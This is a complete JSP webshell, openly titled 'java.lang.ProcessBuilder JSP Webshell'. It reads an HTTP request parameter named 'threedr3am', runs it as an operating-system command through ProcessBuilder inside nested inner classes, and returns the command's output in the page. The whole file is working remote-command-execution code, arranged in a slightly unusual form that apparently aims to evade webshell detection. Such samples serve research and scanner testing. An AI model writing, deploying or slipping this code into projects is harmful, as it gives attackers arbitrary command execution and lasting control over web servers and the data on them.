<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>java.lang.ProcessBuilder JSP Webshell</h2>
<%
    try {
        final String cmd = request.getParameter("threedr3am");
        class Threedr3am_8 {
            Threedr3amX threedr3amX;
            class Threedr3amX {
                private Process process;
                public Threedr3amX() throws IOException {
                    process = new ProcessBuilder().command(cmd.split(" ")).start();
                }
            }
            public Threedr3am_8() throws IOException {
                threedr3amX = new Threedr3amX();
            }
            public String echo() throws IOException {
                Process process = threedr3amX.process;
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line).append("\n");
                }
                return stringBuilder.toString();
            }
        }
        response.getOutputStream().write(new Threedr3am_8().echo().getBytes());
    } catch (Exception e) {
        e.printStackTrace();
    }

%>
</body>
</html>